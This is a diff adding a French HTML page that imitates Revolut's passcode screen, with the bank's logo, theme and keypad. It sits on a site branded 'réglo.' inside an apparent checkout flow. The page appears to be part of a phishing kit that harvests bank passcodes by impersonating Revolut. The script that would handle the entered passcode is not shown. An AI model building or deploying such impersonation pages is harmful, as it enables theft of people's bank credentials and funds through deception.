@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Revolut - Passcode</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="revolut_theme.css">
+</head>
+<body class="revolut-theme" id="revolut-passcode-page"> <!-- Added ID for consistency -->
+    <!-- Header -->
+    <header class="revolut-header">
+        <div class="revolut-logo">
+            <div class="logo">réglo<span>.</span></div>
+        </div>
+    </header>
+
+    <!-- Main Content -->
+    <main class="revolut-container">
+        <div class="revolut-card">
+            <!-- Logo -->
+            <div class="revolut-auth-logo">
+                <img src="Revolut-Logo.wine.png" alt="Revolut" class="revolut-logo-img">
+            </div>
+            
+            <h1 class="revolut-title">Entrez votre passcode</h1>
+            <p class="revolut-subtitle">Pour accéder à votre compte Revolut</p>
+            
+            <!-- Single Passcode Input -->
+            <div class="revolut-passcode-wrapper">
+                <input type="password" class="revolut-passcode-input" id="passcodeInput" autocomplete="off" placeholder="Tapez votre passcode">
+            </div>
+            
+            <a href="#" class="revolut-passcode-link">Passcode oublié ?</a>
+            
+            <!-- Keypad -->
+            <div class="revolut-keypad">
+                <div class="revolut-key" data-key="1">1</div>
+                <div class="revolut-key" data-key="2">2</div>
+                <div class="revolut-key" data-key="3">3</div>
+                <div class="revolut-key" data-key="4">4</div>
+                <div class="revolut-key" data-key="5">5</div>
+                <div class="revolut-key" data-key="6">6</div>
+                <div class="revolut-key" data-key="7">7</div>
+                <div class="revolut-key" data-key="8">8</div>
+                <div class="revolut-key" data-key="9">9</div>
+                <div class="revolut-key revolut-key-special" id="clearKey">Effacer</div>
+                <div class="revolut-key" data-key="0">0</div>
+                <div class="revolut-key revolut-key-special" id="submitKey">OK</div>
+            </div>
+        </div>
+    </main>
+
+    <!-- Footer -->
+    <footer class="revolut-footer">
+        <p>Vérification en cours<span id="revolutLoadingDots"></span></p>
+    </footer>
+
+    <script src="checkout_flow.js" defer></script>
+</body>
+</html>
